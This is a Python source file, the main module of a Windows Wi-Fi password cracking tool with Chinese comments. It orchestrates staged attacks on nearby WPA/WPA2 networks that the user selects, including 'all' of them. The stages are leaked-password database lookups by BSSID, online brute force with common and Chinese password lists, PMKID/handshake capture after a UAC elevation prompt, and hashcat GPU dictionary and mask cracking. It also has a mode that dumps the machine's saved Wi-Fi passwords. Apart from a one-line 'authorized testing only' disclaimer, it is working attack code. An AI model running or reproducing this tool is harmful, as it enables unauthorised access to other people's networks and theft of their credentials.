#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi Cracker v3.0 Windows 版
智能攻击编排器 — 5阶段递进攻击
Python + pywifi + netsh + hashcat GPU

仅限授权安全测试使用，请遵守当地法律法规。
"""

import sys
import os
import time
import argparse
import signal
import ctypes
from typing import List, Optional

# 添加当前目录到路径
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from wifi_scanner import WiFiScanner, WiFiNetwork, ConnectResult
from dict_generator import (
    TOP_PASSWORDS, build_top_passwords, build_full_passwords,
    generate_chinese_passwords, generate_router_defaults, generate_ssid_smart,
    save_wordlist,
)
from p3wifi_client import query_by_bssid, query_full, download_wpa_sec_dict, load_wpa_sec_passwords
from hashcat_crack import (
    check_hashcat, benchmark, crack_with_dict, crack_with_mask, crack_all,
    HashcatConfig, find_hashcat, generate_wordlist, get_smart_masks,
)
from pmkid_capture import capture_pmkid, check_npcap, PMKIDResult

# ============================================================
# 版本信息
# ============================================================
VERSION = "3.0.0-windows"
BANNER = f"""
  ╔══════════════════════════════════════════════════╗
  ║   WiFi Cracker v{VERSION}                  ║
  ║   全球密码库 + 智能字典 + GPU离线破解            ║
  ║   Windows 版 · 仅限授权安全测试                  ║
  ╚══════════════════════════════════════════════════╝
"""

# 脚本所在目录
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURES_DIR = os.path.join(SCRIPT_DIR, "captures")
WPA_SEC_FILE = os.path.join(SCRIPT_DIR, "wpa-sec-cracked.txt")


def main():
    parser = argparse.ArgumentParser(description="WiFi安全测试工具 (Windows)")
    parser.add_argument('-t', '--target', default='', help='指定目标SSID')
    parser.add_argument('-d', '--dict', default='', help='额外字典文件路径')
    parser.add_argument('--delay', type=int, default=200, help='在线爆破间隔(毫秒)')
    parser.add_argument('--scan', action='store_true', help='仅扫描不爆破')
    parser.add_argument('--hashcat', action='store_true', help='hashcat GPU独立模式')
    parser.add_argument('--hash', default='', help='hashcat哈希文件(.22000)')
    parser.add_argument('--mask', action='store_true', help='仅掩码暴力攻击')
    parser.add_argument('--no-pywifi', action='store_true', help='不使用pywifi，仅用netsh')
    parser.add_argument('--show-passwords', action='store_true', help='显示系统已保存的WiFi密码')
    parser.add_argument('--pmkid', action='store_true', help='PMKID捕获模式（需管理员权限，会短暂断网）')
    parser.add_argument('-v', '--verbose', action='store_true', default=True, help='详细日志')
    parser.add_argument('--version', action='store_true', help='显示版本')
    args = parser.parse_args()

    if args.version:
        print(f"wifi-crack v{VERSION}")
        return

    print(BANNER)

    # ── PMKID捕获模式 ──
    if args.pmkid:
        run_pmkid_mode(args)
        return

    # ── 独立模式：hashcat离线破解 ──
    if args.hashcat and args.hash:
        run_hashcat_only(args.hash, args.dict, args.mask, args.verbose)
        return

    # ── 初始化WiFi引擎 ──
    print("  [0/3] 初始化WiFi引擎...")
    scanner = WiFiScanner(prefer_pywifi=not args.no_pywifi)

    if not scanner.is_available():
        print("  [!] 未检测到可用的WiFi接口")
        print("  [!] 请确保WiFi已开启且网卡驱动正常")
        sys.exit(1)

    print(f"  [+] WiFi引擎: {scanner.engine_name}")
    if scanner.pywifi_engine.is_available():
        print(f"  [+] pywifi接口: {scanner.pywifi_engine.get_interface_name()}")
    else:
        print(f"  [!] pywifi不可用，使用netsh备用引擎（pip install pywifi 可启用快速引擎）")

    # ── 显示已保存密码 ──
    if args.show_passwords:
        show_saved_passwords(scanner)
        return

    # ── 扫描WiFi ──
    print("\n  [1/3] 扫描附近WiFi网络...")
    networks = scanner.scan()

    if not networks:
        print("  [!] 未扫描到WiFi网络")
        print("  [!] 请确保WiFi已开启")
        sys.exit(1)

    print(f"  [+] 扫描到 {len(networks)} 个WiFi网络")

    # ── 选择目标 ──
    if args.target:
        targets = [n for n in networks if n.ssid == args.target]
        if not targets:
            print(f"  [!] 未找到目标: {args.target}")
            sys.exit(1)
        print_wifi_table(targets, "指定目标")
    else:
        print_wifi_table(networks, "全部WiFi网络")

        if args.scan:
            print("\n  [*] 扫描完成（--scan 模式）")
            return

        targets = interactive_select(networks)
        if not targets:
            print("\n  [!] 未选择任何目标")
            return

    # ── 智能攻击 ──
    run_smart_attack(scanner, targets, args.dict, args.delay, args.verbose)


# ============================================================
# 打印WiFi列表表格
# ============================================================
def print_wifi_table(networks: List[WiFiNetwork], title: str):
    print(f"\n  {title} ({len(networks)} 个):")
    print("  ┌─────┬──────────────────────────┬────────┬──────────────────┬─────┬───────────────────┐")
    print("  │  #  │ SSID                     │ 信号   │ 安全类型         │ 频道│ BSSID             │")
    print("  ├─────┼──────────────────────────┼────────┼──────────────────┼─────┼───────────────────┤")
    for i, n in enumerate(networks):
        ssid_display = n.ssid[:24] + ('…' if len(n.ssid) > 24 else '')
        sec_display = n.security[:16] if n.security else ''
        bssid_display = n.bssid[:17] if n.bssid else ''
        print(f"  │ {i+1:<3d} │ {ssid_display:<24s} │ {n.rssi:>4d}   │ {sec_display:<16s} │ {n.channel:<3d} │ {bssid_display:<17s} │")
    print("  └─────┴──────────────────────────┴────────┴──────────────────┴─────┴───────────────────┘")


# ============================================================
# 交互式选择WiFi目标
# ============================================================
def interactive_select(networks: List[WiFiNetwork]) -> List[WiFiNetwork]:
    print("\n  ╔══════════════════════════════════════════════╗")
    print("  ║          交互式目标选择                      ║")
    print("  ╠══════════════════════════════════════════════╣")
    print("  ║  输入编号选择目标，支持以下格式：            ║")
    print("  ║    单选:  3                                  ║")
    print("  ║    多选:  1,3,5                              ║")
    print("  ║    范围:  1-5                                ║")
    print("  ║    混合:  1,3-5,8                            ║")
    print("  ║    全选:  all                                ║")
    print("  ║    退出:  q                                  ║")
    print("  ╚══════════════════════════════════════════════╝")

    try:
        user_input = input("\n  请选择目标: ").strip()
    except (EOFError, KeyboardInterrupt):
        return []

    if not user_input or user_input.lower() in ('q', 'quit', 'exit'):
        return []

    if user_input.lower() == 'all':
        print(f"  [+] 已选择全部 {len(networks)} 个目标")
        return networks

    # 解析选择
    indices = parse_selection(user_input, len(networks))
    if not indices:
        print("  [!] 无效的输入")
        return []

    targets = [networks[i] for i in indices]
    print(f"\n  [+] 已选择 {len(targets)} 个目标:")
    for i, t in enumerate(targets):
        print(f"      {i+1}. {t.ssid} ({t.security}, {t.rssi}dBm)")

    return targets


def parse_selection(text: str, max_len: int) -> List[int]:
    """解析 '1,3-5,8' 格式的选择字符串，返回0-based索引"""
    seen = set()
    result = []

    for part in text.split(','):
        part = part.strip()
        if not part:
            continue

        if '-' in part:
            try:
                a, b = part.split('-', 1)
                start, end = int(a.strip()), int(b.strip())
                if start > end:
                    start, end = end, start
                for i in range(start, end + 1):
                    idx = i - 1
                    if 0 <= idx < max_len and idx not in seen:
                        seen.add(idx)
                        result.append(idx)
            except:
                continue
        else:
            try:
                idx = int(part) - 1
                if 0 <= idx < max_len and idx not in seen:
                    seen.add(idx)
                    result.append(idx)
            except:
                continue

    return result


# ============================================================
# 智能攻击编排器
# ============================================================
def run_smart_attack(scanner: WiFiScanner, targets: List[WiFiNetwork],
                     dict_file: str, delay: int, verbose: bool):
    start_time = time.time()

    print("\n  ╔══════════════════════════════════════════════════════════╗")
    print("  ║        智能攻击编排器 (Smart Attack) - Windows          ║")
    print("  ║  密码库查询 → TOP密码 → GPU破解 → 字典爆破             ║")
    print("  ╠══════════════════════════════════════════════════════════╣")
    print("  ║  适用目标:                                              ║")
    print("  ║  ✓ WPA2-Personal  — 字典/暴力可破（弱密码极易）        ║")
    print("  ║  ✓ WPA/WPA2混合   — 同上，兼容模式更容易               ║")
    print("  ║  △ WPA3-Transition — 可降级为WPA2后破解               ║")
    print("  ║  ✗ WPA3-Only       — SAE阻止离线破解（极难）         ║")
    print("  ║  ✗ WPA2-Enterprise — 需要证书，字典无效              ║")
    print("  ╚══════════════════════════════════════════════════════════╝")

    # 记录原始WiFi
    original_ssid = scanner.current_ssid()
    if original_ssid:
        print(f"  [*] 当前WiFi: {original_ssid}（完成后自动恢复）")

    # 预加载系统已保存密码（可作为额外情报）
    saved_passwords = scanner.get_saved_passwords()
    if saved_passwords:
        print(f"  [+] 系统已保存 {len(saved_passwords)} 个WiFi密码（可用于交叉验证）")

    success_count = 0

    for ti, target in enumerate(targets):
        print(f"\n  ━━ 目标 [{ti+1}/{len(targets)}] {target.ssid} "
              f"(BSSID:{target.bssid} CH:{target.channel} {target.rssi}dBm {target.security}) ━━")

        # 跳过不适合爆破的网络
        if should_skip(target):
            print(f"    [!] 跳过: 不适合在线爆破的网络类型")
            continue

        result = attack_single_target(scanner, target, dict_file, delay,
                                      verbose, saved_passwords)
        if result:
            success_count += 1

    # 恢复原始WiFi
    if original_ssid:
        print(f"\n  [*] 正在恢复原WiFi: {original_ssid} ...", end="")
        if scanner.reconnect(original_ssid):
            print(" ✓ 已恢复")
        else:
            print(" ✗ 恢复失败，请手动连接")

    elapsed = time.time() - start_time
    print(f"\n  ━━ 智能攻击完成: {len(targets)}个目标, 成功{success_count}个, "
          f"总耗时{format_duration(elapsed)} ━━")

    sys.exit(0 if success_count > 0 else 1)


def should_skip(target: WiFiNetwork) -> bool:
    """判断是否应该跳过该网络"""
    sec = target.security.upper() if target.security else ""
    # 企业认证
    if "ENTERPRISE" in sec or "802.1X" in sec:
        return True
    # 开放网络
    if sec in ("", "OPEN", "开放式") or ("开放" in sec and "无" in sec):
        return True
    return False


def attack_single_target(scanner: WiFiScanner, target: WiFiNetwork,
                         dict_file: str, delay: int, verbose: bool,
                         saved_passwords: dict) -> bool:
    """
    对单个目标执行5阶段递进攻击
    返回是否成功
    """

    # ── Phase 0: 检查系统已保存密码 ──
    if target.ssid in saved_passwords:
        pwd = saved_passwords[target.ssid]
        print(f"  [Phase 0] 系统已保存密码: {pwd}")
        print(f"    验证连接中...")
        if scanner.try_connect(target.ssid, pwd, target.security):
            print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} 密码={pwd}（系统已保存）")
            scanner.disconnect()
            return True
        else:
            print(f"    ✗ 已保存密码验证失败（可能已更换密码）")

    # ── Phase 1: 全球WiFi密码库查询（秒级） ──
    print(f"  [Phase 1] 全球WiFi密码库查询（p3wifi 3wifi.dev）...")
    if target.bssid:
        phase1_hit = False

        # 1a. p3wifi查询
        print(f"    [1a] p3wifi数据库查询 BSSID={target.bssid} ...", end="")
        pwd, err = query_by_bssid(target.bssid)
        if pwd:
            print(f" ✓ 命中! 密码=[{pwd}]")
            print(f"    验证连接中...")
            if scanner.try_connect(target.ssid, pwd, target.security):
                print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} 密码={pwd}（p3wifi全球密码库）")
                scanner.disconnect()
                return True
            else:
                print(f"    ✗ p3wifi密码验证失败（可能已更换密码）")
        elif err:
            print(f" 查询失败: {err}")
        else:
            print(f" 未收录")

        # 尝试历史密码
        if not phase1_hit:
            full_results = query_full(target.bssid, target.ssid)
            for r in full_results:
                if r.password == pwd:
                    continue
                print(f"    [1a] 尝试历史密码: {r.password} ...", end="")
                if scanner.try_connect(target.ssid, r.password, target.security):
                    print(f" ✓ 命中!")
                    print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} 密码={r.password}（{r.source}）")
                    scanner.disconnect()
                    return True
                print(f" ✗")
                time.sleep(0.2)
    else:
        print(f"    - BSSID为空，跳过在线查询")

    # ── Phase 2: 快速验证TOP密码（秒级） ──
    top_passwords = build_top_passwords(target.ssid)
    print(f"  [Phase 2] 快速验证TOP{len(top_passwords)}个密码...")

    for i, pwd in enumerate(top_passwords):
        print(f"\r    [{i+1}/{len(top_passwords)}] 尝试: {pwd:<20s}", end="", flush=True)
        if scanner.try_connect(target.ssid, pwd, target.security):
            print(f"\n    ✓ 命中! 密码={pwd}")
            print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} 密码={pwd}（TOP密码快速验证）")
            scanner.disconnect()
            return True
        time.sleep(delay / 1000.0 * 0.3)  # Phase 2用更短的间隔

    print(f"\n    - TOP {len(top_passwords)}个密码均未命中")

    # ── Phase 3: 握手包捕获 + hashcat GPU破解 ──
    # 用 netsh trace 捕获 EAPoL 握手包（只断网1次），然后 hashcat GPU 离线破解
    hashcat_ok, hashcat_info = check_hashcat()

    # 先检查是否已有哈希文件（之前捕获的）
    hash_file = find_hash_file(target.ssid, target.bssid)

    # 没有哈希文件 → 尝试自动捕获握手包（需要管理员权限）
    if not hash_file and is_admin() and target.bssid:
        print(f"  [Phase 3] 握手包捕获（netsh trace，会短暂断网）...")
        cap_result = capture_pmkid(target.ssid, target.bssid,
                                   output_dir=CAPTURES_DIR, timeout=30)
        if cap_result.success:
            hash_file = cap_result.hash_file
            print(f"    ✓ 握手包捕获成功! ({cap_result.method})")
            print(f"    哈希文件: {hash_file}")
            # 恢复WiFi
            original = scanner.current_ssid()
            if not original:
                scanner.reconnect(scanner.netsh_engine.current_ssid() or "")
        else:
            print(f"    ✗ 握手包捕获失败: {cap_result.error}")
    elif not hash_file and not is_admin():
        print(f"  [Phase 3] 跳过握手包捕获（需要管理员权限，用 --pmkid 模式）")
    elif hash_file:
        print(f"  [Phase 3] 发现已有哈希文件: {os.path.basename(hash_file)}")

    # Phase 4: hashcat GPU破解
    if hash_file and hashcat_ok:
        print(f"  [Phase 4] hashcat GPU破解...")
        print(f"  [+] {hashcat_info}")

        # 生成字典
        all_pwds = generate_chinese_passwords()
        all_pwds.extend(generate_router_defaults(target.ssid))
        all_pwds.extend(generate_ssid_smart(target.ssid))
        all_pwds = list(dict.fromkeys(all_pwds))

        os.makedirs(CAPTURES_DIR, exist_ok=True)
        wordlist_path = generate_wordlist(all_pwds, CAPTURES_DIR)

        hcfg = HashcatConfig()
        hcfg.hash_file = hash_file
        hcfg.verbose = verbose
        if wordlist_path:
            hcfg.wordlists = [wordlist_path]

        # 添加外部字典
        if dict_file and os.path.exists(dict_file):
            hcfg.wordlists.append(os.path.abspath(dict_file))

        # 本地wifi_dict.txt
        local_dict = os.path.join(SCRIPT_DIR, "..", "wifi_dict.txt")
        if os.path.exists(local_dict):
            hcfg.wordlists.append(os.path.abspath(local_dict))

        # 字典攻击
        print(f"    GPU字典攻击...")
        result = crack_with_dict(hcfg)
        if result.success:
            print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} 密码={result.password}"
                  f"（GPU字典攻击, {format_duration(result.duration)}）")
            return True
        print(f"    - GPU字典攻击未命中")

        # Phase 4b: 掩码攻击
        print(f"  [Phase 4b] GPU掩码暴力攻击...")
        hcfg.mask_attacks = get_smart_masks()[:3]  # 只用前3个掩码（控制耗时）
        hcfg.timeout = 2400  # 40分钟
        result = crack_with_mask(hcfg)
        if result.success:
            print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} 密码={result.password}"
                  f"（GPU掩码攻击, {format_duration(result.duration)}）")
            return True
        print(f"    - GPU掩码攻击未命中")

    else:
        if not hashcat_ok:
            print(f"  [Phase 3-4] 跳过GPU破解（hashcat未安装）")
            print(f"    安装hashcat: https://hashcat.net/hashcat/")
        if not hash_file:
            print(f"  [Phase 3-4] 跳过GPU破解（无哈希文件）")
            print(f"    提示: Windows内置网卡不支持监控模式，无法直接捕获握手包")
            print(f"    方案1: 使用支持监控模式的USB WiFi适配器（如Alfa AWUS036ACH）捕获")
            print(f"    方案2: 将.22000哈希文件放入 captures/ 目录，命名含目标SSID")

    # ── Phase 5: 在线字典爆破（兜底） ──
    top_set = set(top_passwords)

    # 5a: 中国高频密码
    china_pwds = generate_chinese_passwords()
    layer1 = [p for p in china_pwds if p not in top_set]

    # 限制数量，避免耗时过长
    max_layer1 = 5000
    if len(layer1) > max_layer1:
        layer1 = layer1[:max_layer1]

    est_minutes = len(layer1) * (delay / 1000.0) / 60
    print(f"  [Phase 5a] 中国高频密码字典（{len(layer1)}条，预计{est_minutes:.0f}分钟）...")

    for i, pwd in enumerate(layer1):
        if i % 50 == 0:
            elapsed_pct = (i / len(layer1) * 100) if layer1 else 0
            print(f"\r    [{i+1}/{len(layer1)}] ({elapsed_pct:.0f}%) 尝试: {pwd:<20s}",
                  end="", flush=True)

        if scanner.try_connect(target.ssid, pwd, target.security):
            print(f"\n    ✓ 命中! 密码={pwd}")
            print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} 密码={pwd}（中国高频字典）")
            scanner.disconnect()
            return True

        time.sleep(delay / 1000.0)

    print(f"\n    - 中国高频字典 {len(layer1)}条均未命中")

    # 5b: 完整大字典
    tried_set = top_set | set(layer1)
    all_pwds = build_full_passwords(
        target.ssid, dict_file,
        WPA_SEC_FILE if os.path.exists(WPA_SEC_FILE) else ""
    )
    layer2 = [p for p in all_pwds if p not in tried_set]

    max_layer2 = 10000  # 限制最多1万条
    if len(layer2) > max_layer2:
        print(f"  [Phase 5b] 字典爆破（取前{max_layer2}条，原{len(layer2)}条太多）...")
        layer2 = layer2[:max_layer2]
    elif layer2:
        print(f"  [Phase 5b] 字典爆破（{len(layer2)}条）...")

    for i, pwd in enumerate(layer2):
        if i % 50 == 0:
            elapsed_pct = (i / len(layer2) * 100) if layer2 else 0
            print(f"\r    [{i+1}/{len(layer2)}] ({elapsed_pct:.0f}%) 尝试: {pwd:<20s}",
                  end="", flush=True)

        if scanner.try_connect(target.ssid, pwd, target.security):
            print(f"\n    ✓ 命中! 密码={pwd}")
            print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} 密码={pwd}（完整字典爆破）")
            scanner.disconnect()
            return True

        time.sleep(delay / 1000.0)

    if layer2:
        print(f"\n    - 完整字典 {len(layer2)}条均未命中")

    print(f"\n  [!] {target.ssid}: 所有阶段均未命中")
    return False


def find_hash_file(ssid: str, bssid: str) -> Optional[str]:
    """在captures/目录查找对应的.22000哈希文件"""
    if not os.path.exists(CAPTURES_DIR):
        return None

    # 查找文件名包含SSID的.22000文件
    for f in os.listdir(CAPTURES_DIR):
        if f.endswith('.22000') or f.endswith('.hc22000'):
            if ssid.lower() in f.lower() or (bssid and bssid.replace(':', '').lower() in f.lower()):
                return os.path.join(CAPTURES_DIR, f)

    # 找不到匹配的，返回第一个.22000文件（如果用户手动放了）
    for f in os.listdir(CAPTURES_DIR):
        if f.endswith('.22000') or f.endswith('.hc22000'):
            return os.path.join(CAPTURES_DIR, f)

    return None


# ============================================================
# hashcat独立破解模式
# ============================================================
def run_hashcat_only(hash_file: str, dict_file: str, mask_only: bool, verbose: bool):
    print("\n  ══ hashcat GPU独立破解模式 ══")

    ok, info = check_hashcat()
    if not ok:
        print(f"  [!] {info}")
        sys.exit(1)
    print(f"  [+] {info}")

    if not os.path.exists(hash_file):
        print(f"  [!] 哈希文件不存在: {hash_file}")
        sys.exit(1)

    # 基准测试
    speed, speed_info = benchmark()
    if speed > 0:
        print(f"  [+] {speed_info}")

    cfg = HashcatConfig()
    cfg.hash_file = hash_file
    cfg.verbose = verbose

    if not mask_only:
        wordlists = []
        if dict_file and os.path.exists(dict_file):
            wordlists.append(os.path.abspath(dict_file))

        # 生成内置字典
        builtin_pwds = generate_chinese_passwords()
        os.makedirs(CAPTURES_DIR, exist_ok=True)
        tmp_path = generate_wordlist(builtin_pwds, CAPTURES_DIR)
        if tmp_path:
            wordlists.append(tmp_path)

        # 本地wifi_dict.txt
        for candidate in [
            os.path.join(SCRIPT_DIR, "wifi_dict.txt"),
            os.path.join(SCRIPT_DIR, "..", "wifi_dict.txt"),
        ]:
            if os.path.exists(candidate):
                wordlists.append(os.path.abspath(candidate))
                break

        cfg.wordlists = wordlists

    result = crack_all(cfg)
    if result.success:
        print(f"\n  ✓✓✓ 破解成功! 密码={result.password}"
              f"（{result.attack}, 耗时{format_duration(result.duration)}）")
        sys.exit(0)
    else:
        print(f"\n  [!] GPU破解未命中（{result.error}）")
        sys.exit(1)


# ============================================================
# 显示系统已保存的WiFi密码
# ============================================================
def show_saved_passwords(scanner: WiFiScanner):
    print("\n  ══ 系统已保存的WiFi密码 ══")
    passwords = scanner.get_saved_passwords()
    if not passwords:
        print("  [!] 未找到已保存的WiFi密码（需要管理员权限）")
        return

    print(f"  共找到 {len(passwords)} 个:")
    print("  ┌─────┬──────────────────────────┬──────────────────────────┐")
    print("  │  #  │ SSID                     │ 密码                     │")
    print("  ├─────┼──────────────────────────┼──────────────────────────┤")
    for i, (ssid, pwd) in enumerate(passwords.items()):
        print(f"  │ {i+1:<3d} │ {ssid:<24s} │ {pwd:<24s} │")
    print("  └─────┴──────────────────────────┴──────────────────────────┘")


# ============================================================
# 工具函数
# ============================================================
def format_duration(seconds: float) -> str:
    if seconds < 60:
        return f"{seconds:.0f}秒"
    elif seconds < 3600:
        return f"{seconds/60:.1f}分钟"
    else:
        return f"{seconds/3600:.1f}小时"


# ============================================================
# 管理员权限检测与自动提权
# ============================================================
def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def request_admin_and_rerun():
    """以管理员权限重新启动当前脚本（保留所有命令行参数）"""
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([f'"{script}"'] + [f'"{a}"' for a in sys.argv[1:]])
    print("  [!] 需要管理员权限，正在请求UAC提权...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, SCRIPT_DIR, 1)
    sys.exit(0)


# ============================================================
# PMKID捕获模式
# ============================================================
def run_pmkid_mode(args):
    """PMKID捕获模式：扫描WiFi → 选择目标 → 捕获PMKID → hashcat破解"""

    # 检测管理员权限
    if not is_admin():
        request_admin_and_rerun()
        return

    print("  ══ PMKID 捕获模式 ══")
    print(f"  管理员权限: ✓")

    # 扫描WiFi
    print("\n  [1/4] 扫描附近WiFi网络...")
    scanner = WiFiScanner(prefer_pywifi=not args.no_pywifi)
    if not scanner.is_available():
        print("  [!] 未检测到WiFi接口")
        sys.exit(1)

    networks = scanner.scan()
    if not networks:
        print("  [!] 未扫描到WiFi网络")
        sys.exit(1)

    # 过滤掉开放/企业网络，只保留WPA/WPA2个人
    wpa_nets = [n for n in networks if not should_skip(n)]
    if not wpa_nets:
        print("  [!] 未找到可攻击的WPA/WPA2网络")
        wpa_nets = networks  # 回退到全部

    # 选择目标
    if args.target:
        targets = [n for n in networks if n.ssid == args.target]
        if not targets:
            print(f"  [!] 未找到目标: {args.target}")
            sys.exit(1)
    else:
        print_wifi_table(wpa_nets, "可攻击的WiFi网络")
        targets = interactive_select(wpa_nets)
        if not targets:
            return

    # 记录当前WiFi用于恢复
    original_ssid = scanner.current_ssid()
    if original_ssid:
        print(f"\n  [*] 当前WiFi: {original_ssid}（完成后自动恢复）")

    # 对每个目标尝试捕获PMKID
    print(f"\n  [2/4] 开始PMKID捕获（会短暂断开WiFi）...")
    for i, target in enumerate(targets):
        print(f"\n  ── 目标 [{i+1}/{len(targets)}] {target.ssid} "
              f"(BSSID:{target.bssid} {target.rssi}dBm) ──")

        result = capture_pmkid(target.ssid, target.bssid,
                               output_dir=CAPTURES_DIR, timeout=30)

        if result.success:
            print(f"\n  ✓ PMKID捕获成功!")
            print(f"    PMKID:    {result.pmkid}")
            print(f"    hashline: {result.hashline}")
            print(f"    文件:     {result.hash_file}")

            # 恢复WiFi
            if original_ssid:
                print(f"\n  [3/4] 恢复WiFi: {original_ssid}...")
                scanner.reconnect(original_ssid)
                time.sleep(2)

            # 尝试hashcat破解
            print(f"\n  [4/4] hashcat GPU破解...")
            hashcat_ok, hashcat_info = check_hashcat()
            if hashcat_ok:
                print(f"  [+] {hashcat_info}")

                # 生成字典
                all_pwds = generate_chinese_passwords()
                all_pwds.extend(generate_router_defaults(target.ssid))
                all_pwds = list(dict.fromkeys(all_pwds))
                os.makedirs(CAPTURES_DIR, exist_ok=True)
                wordlist_path = generate_wordlist(all_pwds, CAPTURES_DIR)

                hcfg = HashcatConfig()
                hcfg.hash_file = result.hash_file
                hcfg.verbose = True
                if wordlist_path:
                    hcfg.wordlists = [wordlist_path]

                # 字典攻击
                hresult = crack_with_dict(hcfg)
                if hresult.success:
                    print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} "
                          f"密码={hresult.password}（GPU字典, {format_duration(hresult.duration)}）")
                    continue

                # 掩码攻击
                print(f"    字典未命中，尝试掩码暴力...")
                hcfg.mask_attacks = get_smart_masks()[:3]
                hcfg.timeout = 2400
                hresult = crack_with_mask(hcfg)
                if hresult.success:
                    print(f"\n  ✓✓✓ 破解成功! SSID={target.ssid} "
                          f"密码={hresult.password}（GPU掩码, {format_duration(hresult.duration)}）")
                    continue

                print(f"    GPU破解未命中")
            else:
                print(f"  [!] hashcat未安装: {hashcat_info}")
                print(f"  [!] 请安装hashcat后用以下命令破解:")
                print(f"      hashcat -m 22000 -a 0 {result.hash_file} <字典文件>")
        else:
            print(f"    ✗ PMKID捕获失败: {result.error}")

    # 恢复WiFi
    if original_ssid:
        print(f"\n  恢复WiFi: {original_ssid}...")
        scanner.reconnect(original_ssid)

    print(f"\n  ══ PMKID模式完成 ══")


if __name__ == '__main__':
    # 处理Ctrl+C
    signal.signal(signal.SIGINT, lambda s, f: (print("\n\n  [!] 用户中断"), sys.exit(130)))
    main()
